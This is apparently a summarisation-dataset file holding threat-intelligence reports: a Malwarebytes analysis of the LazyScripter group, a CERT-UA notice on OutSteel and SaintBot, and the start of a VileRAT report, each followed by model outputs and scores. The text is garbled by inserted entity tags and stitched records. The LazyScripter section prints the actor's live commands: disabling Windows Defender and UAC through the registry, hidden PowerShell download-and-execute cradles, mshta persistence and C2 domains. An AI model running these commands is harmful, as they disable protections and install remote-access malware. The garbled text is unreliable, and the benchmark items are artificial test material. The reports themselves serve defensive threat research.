HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run \" /v \" [WORK_OF_ART] Windows [WORK_OF_ART] Defender \" /f reg delete \" HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run \" /v \" WindowsDefender \" /f reg delete \" [GPE] HKCR\\*\\shellex\\ContextMenuHandlers\\EPP \" /f17reg delete \" HKCR\\Directory\\shellex\\ContextMenuHandlers\\EPP \" /f reg delete \" HKCR\\Drive\\shellex\\ContextMenuHandlers\\EPP \" /f reg add \" HKLM\\System\\CurrentControlSet\\Services\\WdBoot \" /v \" Start \" /t REG_DWORD /d \" [CARDINAL] 4 \" /f reg add \" [WORK_OF_ART] HKLM\\System\\CurrentControlSet\\Services\\WdFilter \" /v \" Start \" /t REG_DWORD /d \" [CARDINAL] 4 \" /f reg add \" [PERSON] HKLM\\System\\CurrentControlSet\\Services\\WdNisDrv \" /v \" Start \" /t REG_DWORD /d \" [CARDINAL] 4 \" /f reg add \" HKLM\\System\\CurrentControlSet\\Services\\WdNisSvc \" /v \" Start \" /t REG_DWORD /d \" [CARDINAL] 4 \" /f reg add \" HKLM\\System\\CurrentControlSet\\Services\\WinDefend \" /v \" Start \" /t REG_DWORD /d \" [CARDINAL] 4 \" /f reg add \" HKLM\\System\\CurrentControlSet\\Services\\SecurityHealthService \" /v \" Start \" /t REG_DWORD /d \" [CARDINAL] 4 \" /f reg.exe ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d [CARDINAL] 0 /f reg add \" HKLM\\System\\CurrentControlSet\\Services\\SecurityHealthService \" /v \" Start \" /t REG_DWORD /d \" [CARDINAL] 4 \" /f reg.exe ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d [CARDINAL] 0 /f\u2022Calling [PERSON] PowerShell.exe to download another batch file . The actor has used another URL shortener \u201c is.gd \u201d which redirects to a [GPE] Github repository to download that batch file : powershell -WindowStyle Hidden -command \" [ORG] IEX ( New [ORG] - Object [ORG] Net . WebClient).DownloadFile('url s\\pus.bat ' ) ; \" C:\\Users\\Public\\Libraries\\pus.batThe pus.bat script is also obfuscated by the [ORG] BatchEncryption tool and executes the following [ORG] PowerShell command . This command connects to its server to deploy its [ORDINAL] first multi - stage RAT which is Octopus : powershell -w hidden \" Add [WORK_OF_ART] - Type [WORK_OF_ART] -AssemblyName [WORK_OF_ART] System . Core;IEX ( New [ORG] - Object [ORG] Net . WebClient).DownloadString('url gateway.net:80/hpjs.php');\"\u2022Performing the following actions which in fact make both [ORG] Octopus and [ORG] Koadic persistence through both the [ORG] AutoRun registry key and scheduled task . [PERSON] Koadic [PERSON] Persistence : reg add \" HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run \" /v \" # [ORG] OneDrive \" /t REG_SZ /d \" cmd /c powershell -w hidden \\\"Add - Type - AssemblyName System . Core;IEX ( New [ORG] - Object [ORG] Net . WebClient).DownloadString('url gateway.net:80/hpjs.php');\\\"\"Powershell.exe -ExecutionPolicy [PERSON] Bypass -WindowStyle Hidden -noprofile - noexit -c [ORG] Invoke [ORG] - Command -ScriptBlock { schtasks /create /TN AutomaticChromeUpdater /TR ' mshta url gateway.net:8080/MicrosoftUpdate ' /SC minute /mo [CARDINAL] 60 } \" C:\\WINDOWS\\system32\\schtasks.exe \" /create /TN AutomaticChromeUpdater /TR \" mshta url \" /SC minute /mo 6018Octopus Persistence : reg add \" HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run \" /v \" New Value # 1 \" /t REG_SZ /d \" mshta url [ORG] gateway.net:8080/MicrosoftUpdate \" /f powershell Add [ORG] - MpPreference [ORG] - [ORG] ExclusionPath \" C : \" -FORCEPowershell.exe -ExecutionPolicy [PERSON] Bypass -WindowStyle Hidden -noprofile - noexit -c [ORG] Invoke [ORG] - Command -ScriptBlock { schtasks /create /TN AutomaticU /TR ' C:\\Users\\Public\\Libraries\\pus.bat ' /SC minute /mo [CARDINAL] 120 } \" C:\\WINDOWS\\system32\\schtasks.exe \" /create /TN AutomaticU /TR [WORK_OF_ART] C:\\Users\\Public\\Libraries\\pus.bat [WORK_OF_ART] /SC minute /mo 120The [ORDINAL] first [ORG] PowerShell command downloads the [CARDINAL] Octopus PowerShell agent from the following URL : url This agent has been obfuscated by the attacker . The [ORG] Octopus agent is responsible for communicating with its [ORG] C&C server to send and receive commands . To start its communications , it collects the following information from the victim machine : Figure [CARDINAL] 18 : Loading [PERSON] Koadic\u2022 [PERSON] Host name ( with the addition of [CARDINAL] five random characters to the [ORG] end)\u2022 [PRODUCT] User name ( if the user name has the administrator role it adds \u201c * \u201d to it)\u2022 OS version\u2022 OS architecture\u2022The process i d that is executing this PowerShell script\u2022 Victim \u2019s [ORG] Network domainThen it builds a header with the following format:19$HEADER = \" $ hostname , $ username , $ OS_version , $ [MONEY] OS_arch , $ process_id , $ [ORG] domain\"In the next step , it encrypts the header using [ORG] AES encryption and then encodes the generated encrypted header using [PERSON] Base64 . The Key and IV for encryption are [PERSON] Base64 hardcoded . Then it sends an HTTP get request to its server with the generated header as authorization header field . Figure [CARDINAL] 19 : Encryption functionFigure [CARDINAL] 20 : Http get requestAfter sending the request , it goes into a loop to receive commands from the server . The received commands are specific to the victim and the generated URL is the combination of the C&C URL and generated host name . The received commands are [PERSON] Base64 encoded and [ORG] AES encrypted and therefore it [ORDINAL] first decodes and decrypts the commands and then based on the commands it does the required actions.20Figure [CARDINAL] 21 : CommandsHere is the list of [ORG] commands:\u2022False : If the command is False it does nothing.\u2022 Report : It collects victim \u2019s info including list of all of the running processes , local [ORG] IP address , OS version , last boot time , OS locale and current time and then encrypts and [PERSON] Base64 encodes them and sends them in the authorization HTTP field to the server.\u2022 Download : [WORK_OF_ART] Upload the content of a specified file to the server.\u2022reset - pc : It seems this feature is not still implemented . It also deploys another variant of [ORG] Octopus agent through [ORG] JavaScript ( mshta url [PERSON] gateway[.]net:8080 / hta ) . This script calls the [ORG] PowerShell to download the Octopus agent.21Figure [CARDINAL] 22 : Js scriptFigure [CARDINAL] 23 : [ORG] PowerShell command after deobfuscationAfter deploying Octopus it deploys [ORG] Koadic by calling mshta:\"mshta url \" /f powershell Add [ORG] - MpPreference -ExclusionPath \" C : \" -FORCEThe actor has used mshta and rundll32.exe for [ORG] Koadic stagers . \"C:\\Windows\\System32\\rundll32.exe \" url ; UGH09GLI5P=;\\ \\ \\ [GPE] \\./mshtml , RunHTMLApplicationFigure [CARDINAL] 24 shows the downloaded [ORDINAL] first stage . This script defines [CARDINAL] 4 random strings with the following sizes : [CARDINAL] 101 , [CARDINAL] 118 , [DATE] 97 , and [CARDINAL] 108 . These strings \u2019 lengths have been used to build the \u201c eval \u201d by converting each string size number to char . In the next step the obfuscated script that will be executed by eval is deobfuscated by passing it to the deobfuscation function ( jRclebKBKY ) . At the end that deobfuscated script is executed by calling eval.22Figure [CARDINAL] 24 : Downloaded jsThe deobfuscated script collects the following information from the victim and then builds a URL and command and makes an HTTP request to the [ORG] Koadic server . Figure [CARDINAL] 25 : Deobfuscated js\u2022Checks SeDebugPrivilege through \u201c whoami /all \u201d command\u2022 Gets OS version and Build by reading their relative registry locations\u2022 Gets group policy history through reading registry location\u2022 Gets processor architecture\u2022Lists directories in temp folder\u2022 Gets the contents of the [ORG] IP routing table by executing the \u201c route print \u201d command\u2022 Gets computer name and username\u2022 Gets Windows code page23Figure [CARDINAL] 26 : Data collectionIn this case , we observed that [ORG] Koadic acted as a downloader to download and execute RMS , [PERSON] LuminosityLink . In some other cases , the actor used [ORG] Koadic to drop njRat , Remcos and Quasar RAT.\"C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe \" -WindowStyle Hidden -command \" & { ( New [ORG] - Object [ORG] Net . WebClient).DownloadFile('url ' C:\\Users\\Public\\Libraries\\1.exe ' ) } ; \" C:\\Users\\Public\\Libraries\\1.exe \" C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe \" -WindowStyle Hidden -command \" & { ( New [ORG] - Object [ORG] Net . WebClient).DownloadFile('url } ; \" C:\\Users\\Public\\Libraries\\Setup - RMS.exe taskkill /f /im rutserv.exe taskkill /f /im rfusclient.exe reg delete \" HKLM\\SYSTEM\\Remote Manipulator System \" /f attrib + s + h \" [WORK_OF_ART] C:\\Windows\\System32\\vipcatalog \" cd [WORK_OF_ART] C:\\Windows\\System32\\vipcatalog\\ \" rutserv.exe \" /silentinstall regedit /s regedit.reg \" rutserv.exe \" /start [PERSON] @exitNgrokWe have observed some other variants of [ORG] KOCTOPUS where the actor [ORDINAL] first deployed a modified version of Invoke- Ngrok which is a [ORG] PowerShell script that exposes local ports of a victim over the internet . This script has an embedded [PERSON] Base64 encoded payload that is decoded and stored in the [GPE] Libraries directory pretending to be [ORG] RuntimeBroker.exe . This dropped payload achieved persistence through the [ORG] AutoRun registry key and a scheduled task . After deploying [GPE] Ngrok , the loader has deployed both [ORG] Octopus and [ORG] Koadic RATs.25ADS - BackdoorFigure 27 : [ORG] Invoke NgrokIn another case , we observed that the actor has tried to use [ORG] the ADS [ORG] - Backdoor which is a backdoor persistent module of [PERSON] Nishang [PERSON] Framework . [PERSON] Nishang is an open - source [ORG] PowerShell - based framework for offensive security , penetration testing , and red teaming.powershell.exe -exec bypass -c \" [ORG] IEX ( New [ORG] - Object [ORG] Net . WebClient).DownloadString('url Checking -URL url -Arguments \" CHECK\"\"26Figure [CARDINAL] 28 : ADS - BackdoorExecutable VariantWe were able to find [CARDINAL] 7 executables associated with [ORG] KOCTOPUS . All of these executables have been compiled using Pure Basic and have the same compile date ( [DATE] February [DATE] 1st [DATE] 2018 ) and almost all of them were recently uploaded to [ORG] VirusTotal . Having the same compile time might indicate that they have been developed or modified by an automated tool . After further analysis we identified that all of these samples have been generated using a Bat to Exe Converter tool . In fact , the actor has used a tool to convert its batch loader to an executable . The compile time is predefined in this application and does not show the right compilation time . We believe the right compilation time is around the time that the sample has been uploaded to VirusTotal.27Figure [CARDINAL] 29 : [PERSON] Bat to exe convertorThe samples are using different names to pretend they are legitimate applications . Here are some of the names used by these samples:\u2022\u2022\u2022\u201cIATA [CARDINAL] ONE ID.exe \u201d : This has been distributed through a spam campaign on [DATE] Jan 6th , [DATE] 2021 . It is using the [ORG] IATA ONE ID icon to pretend it is that software . ONE ID is a fairly recent concept introduced by [ORG] IATA for contactless identity management that leverages biometric technology . This indicates that this actor is constantly monitoring new [ORG] IATA technologies to update its toolsets respectively.\u201cBSPlinkUpdaterV4.exe \u201d : Similar to the \u201c IATA ONE ID \u201d this has been specifically designed to target airlines that are using BSPLink software . \u201cFederal Skilled [ORG] Worker [ORG] Program [ORG] Eligible Occupations Canada Immigration and [ORG] Visa [ORG] Information [ORG] Canada.exe \u201d : This is designed to target people that are applying to the [GPE] Canada skill worker program . The actor has used decoy documents from a [ORG] Canada [ORG] Immigration website ( Figure [CARDINAL] 30 and Figure [CARDINAL] 31).28Figure [CARDINAL] 30 : Decoy document29Figure [CARDINAL] 31 : Decoy documentThe actor has used several different icons for these executables . Among them we observed one that is an old [GPE] Malwarebytes icon possibly pretending to be our security software.30Figure [CARDINAL] 32 : Used iconsThis Bat to Exe Converter encrypts the batch loader into its resource section . The executable loads the resource , decrypting its content and then executing the batch file . Here is the main process of this loader:\u2022It creates a directory in the % APPDATA%/Temp directory and then creates a batch file in that directory . The name of the directory and batch files are generated randomly . Figure [CARDINAL] 33 : Create Directory\u2022It looks for resources by their hashes and loads them using the LoadResource API call . This executable contains [CARDINAL] 2 resources . [CARDINAL] One of them has been used to generate a key for the RC4 encryption algorithm . The other one is the batch file content that has been encrypted.31Figure [CARDINAL] 34 : Load Resource\u2022\u2022It generates the RC4 key from the resource . It decrypts the content of the other resource and writes it into that created batch file . ( The encryption key is [CARDINAL] 6A2148ADADF8D6E529B08D8BD0800A85).\u2022It calls cmd.exe to execute the generated bat file using CreateProcessW.Figure 35 : RC4 decryption32Vbscript [ORG] VariantThe [ORG] KOCTOPUS vbscript variant has the same functionality as we mentioned in the batch variant with the difference that process execution has been started by a [ORG] VBScript that calls wscript to execute a [ORG] PowerShell command . This [ORG] PowerShell command downloads the batch variant of [ORG] KOCTOPUS . All of the [ORG] VBScript files are obfuscated to make analysis more difficult . In the [ORG] VBA variant , the actor has used the URL shortener cutt.ly to hide its real URL which in this case is a [ORG] GitHub repository hosted at raw.githubusercontent.com . \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe \" -WindowStyle Hidden -command \" [ORG] IEX ( New [ORG] - Object [ORG] Net . WebClient).DownloadFile('url ' C:\\Users\\Public\\Libraries\\reguac.bat ' ) ; \" C:\\Users\\Public\\Libraries\\reguac.batRegistry key variantThis variant sets the [ORG] AutoRun registry key with a [PERSON] Powershell command that downloads and executes the batch variant of KOCTOPUS.EmpoderFiigure [CARDINAL] 36 : [PERSON] Reg variantPrior to using [ORG] Koadic as the main [ORG] RAT this actor has used [ORG] PowerShell [ORG] Empire as its main toolset . To load [PERSON] PowerShell [PERSON] Empire the actor has used its [ORG] Empire [ORG] Loader which we call Empoder . Figure [CARDINAL] 37 : [CARDINAL] WinRaR installerIn fact , the actor has just used a VBS file to load [PERSON] PowerShell [PERSON] Empire , but it has wrapped its VBS into a WinRar installer which is usually bundled with a decoy document . As an example , \u201c Canada Visa.exe \u201d is a WinRar installer that has [CARDINAL] two bundled files : a VBS file and a decoy [PERSON] PDF document . This one is specifically designed to target users of [ORG] Canada [ORG] Visa , a [NORP] Canadian immigration law firm based in [GPE] Montreal , [GPE] Canada . The decoy document was taken from [ORG] the [ORG] Canada [ORG] Visa website.33Figure [CARDINAL] 38 : [ORG] Canada [ORG] Visa decoy document34InfrastructureThe actor has leveraged dynamic [ORG] DNS providers for command - and - control communications . Dynamic [ORG] DNS providers allow people to create free subdomains on shared domains and as you can see the actor has created [CARDINAL] five subdomains on [CARDINAL] four different dynamic [ORG] DNS domains for the communications.\u2022\u2022\u2022\u2022\u2022kasperskylab.ignorelist.comhpsj.firewall - gateway.netgooglechromeupdater.twilightparadox.comiatassl - telechargementsecurity.duckdns.orgstub.ignorelist.comFigure [CARDINAL] 39 : Infrastructure35AttributionWe have examined TTPs , toolsets and infrastructure used by this actor to attribute it to any of the known threat actors . Even though some similarities between this actor and documented [ORG] APT actors such as [GPE] APT28 and OilRig exist , these indicators are not enough to attribute to any of these groups.\u2022 [GPE] APT28 has used [PERSON] Koadic [PERSON] Rat in its past campaigns ; the only similarity between them is the use of [GPE] Koadicopen - source tool which is not a strong indicator to show any connections between [DATE] them.\u2022 OilRig has used the batch to exe tool to convert its [ORG] PowerShell scripts into executables . This is a good indicator that can show there is some overlap between this actor and [ORG] OilRig but there are still some major differences between them that makes us believe they are separate groups . The most similar [ORG] APT actor to the actor we analyzed in this report is [PERSON] Muddy [PERSON] Water . Here is the list of similarities between them:\u2022 Both have used [ORG] Koadic and [GPE] Empire in their previous campaigns\u2022 Both have used scripting languages such as [ORG] PowerShell in their campaigns\u2022 Both have used [ORG] GitHub to host their malicious payloads / scripts . Similar to [PERSON] Muddy [PERSON] Water this actor hasadded forks of some popular toolsets to add some legitimacy to its [GPE] Github account\u2022 Both have used scheduled tasks and Registry Run Keys / Startup Folder for persistenceHowever , there are some key differences between [ORG] them:\u2022 [ORG] Muddy [ORG] Water has employed targeted spear phishing attacks to perform its operations while this actorrelies on spam campaigns\u2022This actor has employed several open - source frameworks and commercial malware such as Octopus , [PERSON] Nishang , [GPE] Quasar , [GPE] Remcos , njRAT , RMS , [ORG] NetWire and LumosityLink RAT that have not been used by Muddy Water\u2022 Unlike [PERSON] Muddy [PERSON] Water that has used macro - weaponized maldocs , this actor has not used macro - embeddeddocuments and instead it directly embeds its loader within [ORG] the [ORG] maldocs\u2022 [ORG] Muddy [ORG] Water has used some custom toolsets such as [ORG] PowerStats and [ORG] SharpStats while this actor mainlyrelies on open - source toolsets to perform its operationsIn terms of used infrastructure , we have seen several [ORG] APT groups that have used dynamic [ORG] DNS for their [ORG] C&C communications including [ORG] Scarlet [ORG] Mimic , [PERSON] Putter [PERSON] Panda , [GPE] Turla , Patchwork and APT33 . More specifically Scarlet Mimic and Putter Panda have used the same free [ORG] DNS provider \u201c firewall-gateway.net \u201d for their [ORG] C&C communications . Still , we have not found any other similarities between these APTs and the actor we analyzed in this report except using a free [ORG] DNS provider which is not reliable in the attribution process . Based on the differences we provided in this section we believe this is a new actor that has not been documented before and therefore we have decided to track this actor as a new group that we call LazyScripter.36ConclusionIn this paper , we uncovered several campaigns associated to an actor group that we believe has been active since [GPE] Visa_Information._Canad.pd ngr.ps1OChpjs.ps1 [NORP] SUPPORT_KITS_USERS.pdf.b kasperskylab.ignorelist.com hpsj.firewall-gateway.net googlechromeupdater.twilightparadox.com iatassl - telechargementsecurity.duckdns.orgScheduled Task Names : [ORG] WindowsVer AutomaticMozila41MITRE [PERSON] ATT&CK techniquesTactic Spear phishing attachment Spear phishing link Windows command shell Native API PowerShellT1053.005Scheduled [CARDINAL] TaskT1047 [ORG] T1546.001 [ORG] T1546.012Windows [ORG] Management [ORG] Instrumentation [ORG] Change [ORG] Default [ORG] File [ORG] Association [ORG] Image [ORG] File [ORG] Execution [ORG] Options [ORG] InjectionT1543.003Windows [ORG] ServicesT1547.001Registry [ORG] Run [ORG] Keys [ORG] / [ORG] Startup [ORG] FolderT1053.005Scheduled TaskT1547.004Win [PERSON] Logon [PERSON] Helper DLLDetailsManual execution by user [GPE] Manual execution by user [PERSON] Starts [PERSON] CMD.EXE for commands executionExecutes [ORG] PowerShell scripts [GPE] Loads [PRODUCT] the [PRODUCT] Task [PRODUCT] Scheduler DLL interface [PRODUCT] Uses [PRODUCT] Task [PRODUCT] Scheduler to run other applications powershell.exe executed via [ORG] WMI reg.exe Changes default file association svchost.exe Changes Image File Execution Options Creates or modifies windows services Modifies Windows Defender service settings Changes the autorun value in the registry [PERSON] Loads [PRODUCT] the [PRODUCT] Task [PRODUCT] Scheduler DLL interface [PRODUCT] Uses [PRODUCT] Task [PRODUCT] Scheduler to run other applications Changes the login / logoff helper path in the registryT1548.002Bypass User Account ControlUses fodhelper and event viewer to bypass [ORG] UACPrivilege [ORG] EscalationT1546.012 [ORG] Defense [ORG] Evasion [ORG] T1562.001Image [ORG] File [ORG] Execution [ORG] Options [ORG] Injection [ORG] Disable or Modify Tools Windows File and Directory Permissions Bypass User Account Control Deobfuscate / Decode Files or InformationT1222.001T1112 T1140T1027Obfuscated [PERSON] Files or InformationChanges Image File Execution Options Modifies Windows Defender service settingsUses ATTRIB.EXE to modify file attributesUses [PERSON] REG.EXE to modify Windows registry [PERSON] Starts [PERSON] MSHTA.EXE for opening [ORG] HTA or [ORG] HTMLS files Uses RUNDLL32.EXE to load library Uses fodhelper and event viewer to bypass UAC [PERSON] Decodes [PERSON] Base64 and decrypts AES encrypted traffic Uses AES encryption Uses obfuscation tools Uses [PERSON] Base64 encoding Obtains list of running processes42DiscoveryT1057Process DiscoveryC&CExfiltrationT1082 T1041System Information Discovery System Network Configuration Discovery System Owner / User Discovery System Time Discovery Multi - Stage Channels Exfiltration Over C2 [ORG] ChannelUse Base64 to encode the data Use AES encryption to encrypt the data43Malwarebytes Inc.3979Freedom Circle , 12th [EVENT] FloorSanta [EVENT] Clara , CA [CARDINAL] 95054USA+1 [CARDINAL] 800 [CARDINAL] 520 2796 \u00a9 2021 Malwarebytes . All Rights Reserved . Any brand name is the property of its respective owner , is used for identification purposes only , and does not imply product endorsement or affiliation with [GPE] Malwarebytes .", "generated_text": "LazyScripter; APT28; Muddy Water; Exploit; email; phishing lures; organizations; airlines; the attackers; RATs; Octopus; Octopus; IATA; the infrastructure; infrastructure; tools; IATA; IATA ONE ID; contactless Passenger Processing; the C&C; the malware; this group; the threat actor; the infrastructure; tactics; procedures; infrastructure; attribution; similarities; APT28; Muddy Water; indicators; compromise; MITRE ATT&CK techniques; RATs; investigation; the code; TTPs.", "ref_text": "<START-1>The report details the activities of a new APT group called LazyScripter that has been active since at least 2018. Initial infection vectors included phishing emails with employment themes as well as IATA and airline themes. The emails contained malicious documents or links to download the group's loader malware called KOCTOPUS or EMPODER. These installed multiple stages of open-source RATs like Octopus, Koadic, and Empire. The group gathered credentials, moved laterally, and overcame network segmentation. They compromised a router VM to use it as a proxy server for data exfiltration from isolated segments. Custom tunneling tools were used to create covert channels. The report analyzes the TTPs, infrastructure, and connections to other APTs. While some similarities exist with groups like APT28 and MuddyWater, key differences indicate LazyScripter is a new undocumented threat actor. Ongoing tracking shows the group is still active, maintaining infrastructure and updating tools. IOCs and MITRE ATT&CK mapping are provided. The report concludes LazyScripter is a developing cyberespionage actor that has targeted various industries over several years, recently focusing on IATA and airlines. Their attacks involve multiple stages of open-source malware and constantly evolving phishing lures. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.4885993485342019, "gpt3/lexical/rouge_rouge2": 0.15081967213114755, "gpt3/lexical/rouge_rougeL": 0.20846905537459282, "gpt3/lexical/rouge_rougeLsum": 0.20846905537459282, "gpt3_generated_text": ["The article discusses the activities of a new APT group called LazyScripter and provides an in-depth analysis of their tactics, techniques, procedures, and infrastructure. The group primarily targets organizations, specifically airlines, using phishing lures in emails. The attackers use various RATs, including Octopus and Koadic, as well as other malware such as LuminosityLink, RMS, Quasar, njRat, and Remcos. The group has been active since at least 2018 and has evolved their toolset over time. The article also compares LazyScripter to known actor groups such as APT28 and Muddy Water in terms of attribution and similarities in their TTPs. The article concludes with indicators of compromise and MITRE ATT&CK techniques associated with LazyScripter."]}, {"split_name": "test", "sample_id": "test_13", "prompt_text": "Extract the keywords: cert-gov-ua.translate.goog /article/18273 CERT - UAGeneral informationThe orderly command of the response on the computer of the supremacy of [ORG] Ukraine CERT - UA took away the information about the rozpovsudzhennya , nachebto , in the name of [ORG] the [ORG] National [ORG] Health [ORG] Service [ORG] of [ORG] Ukraine , electronic mail notifications , which were sent to the ZIP - archiveZIP - archives guessing to avenge a decoy document and [CARDINAL] two identical shortcut files , when they appear on the victim \u2019s computer , a powershell command will be written , which , in its turn , will lead to the capture and launch of the [ORG] OutSteel program ( compilation date : [CARDINAL] 28.01 . 2022 ) . It remains to secure the search for stolen documents on the victim 's computer , as well as to grab and download the [ORG] SaintBot program ( compilation date : 04/30/2021).This activity is directed at the state organizations of [GPE] Ukraine . [PERSON] Valid for CERT - UA no later than [DATE] April [DATE] 2021 under identifier UAC-0056.Indicators of compromiseFiles : load74h74830.exe 1406.exe ( SaintBot)\u041c\u0435\u0440\u0435\u0436\u0435\u0432\u0456 : hxxps://cdn.discordapp[.]com / attachments/908281957039869965/937420906286952568 / d5aadb4ace8ffcchxxp://eumr[.]site / up74987340.exe hxxp://eumr[.]site / load74h74830.exe [PERSON] hxxp://185.244.41[.]109:8080 / upld/ hxxp://8003659902[.]space / wp - adm / gate.php hxxp://smm2021[.]net / wp - adm / gate.php hxxp://8003659902[.]site / wp - adm / gate.php 185.244.41[.]109 testsid@lthhc - zm[.]com\u0425\u043e\u0441\u0442\u043e\u0432\u0456 : % APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\<\u043d\u0430\u0437\u0432\u0430_\u0444\u0430\u0439\u043b\u0443>.exe [PERCENT] % TEMP%\\rmm.bat [PERCENT] % TEMP%\\svjhost.exe % [PERSON] LOCALAPPDATA%\\zz%USER%\\\u0414\u043e\u0434\u0430\u0442\u043a\u043e\u0432\u0430 [PERSON] \u0456\u043d\u0444\u043e\u0440\u043c\u0430\u0446\u0456\u044fOutSteel - a slick program , divided into different versions of AutoIt ; the main functionality is the transfer of files after a specific transfer of file extensions ( transferring files to the control server is required for the help of HTTP POST1/2requests).We swear on the need for additional monitoring of the connection with the public [ORG] Discord service . Graphic imagesRice . [PRODUCT] 1 [PRODUCT] Butt of a swivel electronic sheetRice . [CARDINAL] 2 Application of the program code of the [ORG] OutSteel program2/2", "generated_text": "CERT-UA; the supremacy; Ukraine; the National Health Service; electronic mail notifications; the ZIP-archiveZIP- archives; a decoy document; shortcut files; the victim\u2019s computer; a powershell command; the OutSteel program; the search; stolen documents; the victim\u2019s computer; SaintBot; the OutSteel program; a slick program; different versions; AutoIt; the main functionality; the transfer of files; the control server; HTTP POST1/2requests; the need; additional monitoring; the connection; the public Discord service; graphic imagesRice; the attachments; the need; additional monitoring.", "ref_text": "<START-1>This is a report from Ukraine's CERT-UA about a phishing campaign distributing malware named OutSteel and SaintBot. The attackers sent emails posing as the National Health Service of Ukraine containing ZIP archives. The ZIP archives contained a decoy document and shortcut files. When executed, a PowerShell command is launched that downloads and runs the OutSteel and SaintBot malware. OutSteel is used to exfiltrate specific file types from the victim's computer. SaintBot can be used to further compromise the system. The report provides compilation dates showing the malware was compiled in January and April 2021. The activity targets Ukrainian state organizations and has been tracked by CERT-UA since at least April 2021 under the identifier UAC-0056. The report provides indicators of compromise including file hashes, network indicators, host artifacts, and Discord and control server information. In summary, this is a technical report from CERT-UA detailing a phishing campaign distributing OutSteel and SaintBot malware to Ukrainian state organizations by an actor they have been tracking since early 2021. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.4834437086092715, "gpt3/lexical/rouge_rouge2": 0.1733333333333333, "gpt3/lexical/rouge_rougeL": 0.304635761589404, "gpt3/lexical/rouge_rougeLsum": 0.304635761589404, "gpt3_generated_text": ["The article from CERT-UA discusses a cybersecurity incident involving the distribution of malicious files through electronic mail notifications disguised as messages from the National Health Service of Ukraine. The emails contain ZIP archives with a decoy document and shortcut files that, when opened on the victim's computer, execute a powershell command to launch the OutSteel program. This program is designed to transfer files to a control server using HTTP POST requests. Additionally, the SaintBot program is downloaded to search for and steal documents on the victim's computer. The article emphasizes the importance of monitoring connections to public Discord services and highlights indicators of compromise such as specific file names and network addresses. Ultimately, organizations in Ukraine are urged to enhance their cybersecurity measures to prevent further attacks."]}, {"split_name": "test", "sample_id": "test_14", "prompt_text": "Extract the keywords: securelist.com /vilerat - deathstalkers - continuous - strike/107075/ VileRAT : [ORG] DeathStalker \u2019s continuous strike at foreign and cryptocurrency exchangesAuthorsPierre [ORG] DelcherGiampaolo DedolaIn [DATE] late [DATE] August [DATE] 2020 , we published an overview of [ORG] DeathStalker \u2019s profile and malicious activities , including their Janicab , Evilnum and PowerSing campaigns ( [ORG] PowerPepper was later documented in [DATE] 2020 ) . Notably , we exposed why we believe the threat actor may fit a group of mercenaries , offering hack - for - hire services , or acting as an information broker to support competitive and financial intelligence efforts . Meanwhile , in [DATE] August [DATE] 2020 , we also released a private report on VileRAT to our threat intelligence customers for the [ORDINAL] first time . VileRAT is a Python implant , part of an evasive and highly intricate attack campaign against foreign exchange and cryptocurrency trading companies . We discovered it in [DATE] Q2 [DATE] 2020 as part of an update of the [FAC] Evilnum modus operandi , and attributed it to [ORG] DeathStalker . Malicious activities that we associate with [ORG] DeathStalker \u2019s VileRAT track have been publicly and partly documented since , without any attribution or under different monikers ( Evilnum , PyVil ) , starting in [DATE] September [DATE] 2020 , through [DATE] 2021 and more recently in [DATE] June [DATE] 2022.DeathStalker has indeed continuously leveraged and updated its VileRAT toolchain against the same type of targets since we [ORDINAL] first identified it in [DATE] June [DATE] 2020 . While we comprehensively documented the evolution to our threat intelligence customers recently , and despite existing public indicators of compromise , we regret to note that the campaign is not only ongoing at the time of writing , but also that [ORG] DeathStalker likely increased its efforts to compromise targets using this toolchain recently . We have indeed been able to identify more samples of VileRAT - associated malicious files and new infrastructure since [DATE] March [DATE] 2022 , which may be a symptom of an increase in compromise attempts . We deemed it may be helpful to publicly expose some of our knowledge about VileRAT , to help potential targets better detect and stop such malicious activities . VileRAT \u2019s initial infection and toolset overviewBack in [DATE] the [DATE] summer [DATE] of [DATE] 2020 , [ORG] DeathStalker \u2019s VileRAT initial infection consisted in spear - phishing emails sent to foreign exchange companies , from fake personas ( a fake diamonds trading company for instance ) who shared investment interests . Should the target reply and continue with the conversation , the fake persona would at some point and upon request provide a link to a malicious file hosted on [FAC] Google [FAC] Drive ( a [PRODUCT] Windows shortcut file masquerading as a [ORG] PDF or in a ZIP archive ) , as identification documents . The malicious link would then trigger the execution of arbitrary system commands , to drop a harmless decoy document , as well as a malicious and quite sophisticated binary loader that we dubbed VileLoader . More recently , since [DATE] at [DATE] least [DATE] late [DATE] 2021 , the infection technique has changed slightly , but the initial infection vector is still a malicious message : a Word document ( DOCX , see Figure [CARDINAL] 1 ) is sent to targets via email ( either as an attachment or embedded in the email body whenever possible ) . In [DATE] July [DATE] 2022 , we also noticed that the attackers leveraged chatbots that are embedded in targeted companies \u2019 public websites to send malicious DOCX to their targets.1/21Figure [CARDINAL] 1 . Malicious DOCX social engineering messageThe DOCX documents are frequently named using the \u201c compliance \u201d or \u201c complaint \u201d keywords ( as well as the name of the targeted company ) , suggesting the attacker is answering an identification request or expressing an issue as a reason to send them . The initial infection and toolset deployment , as we observed them starting in [DATE] at [DATE] least [DATE] late [DATE] 2021 , are schematized below ( see Figure [QUANTITY] 2).Figure [QUANTITY] 2 . VileRAT infection and toolset overview A bit of stomping and concealment up to VileDropperThe initial DOCX infection document itself is innocuous , but it contains a link to another malicious and macro - enabled DOTM document as a \u201c remote template \u201d ( see Figure [CARDINAL] 3 ) . These [GPE] DOTM files are automatically downloaded by Word when the [ORG] DOCX is opened , and its embedded macro is triggered if the recipient enabled execution ( as requested by the social engineering message , see Figure [CARDINAL] 1).1234<?xml version=\"1.0 \" encoding=\"UTF-8 \" standalone=\"yes\"?><Relationships xmlns=\"url\"><Relationship [GPE] Id=\"rId1 \" 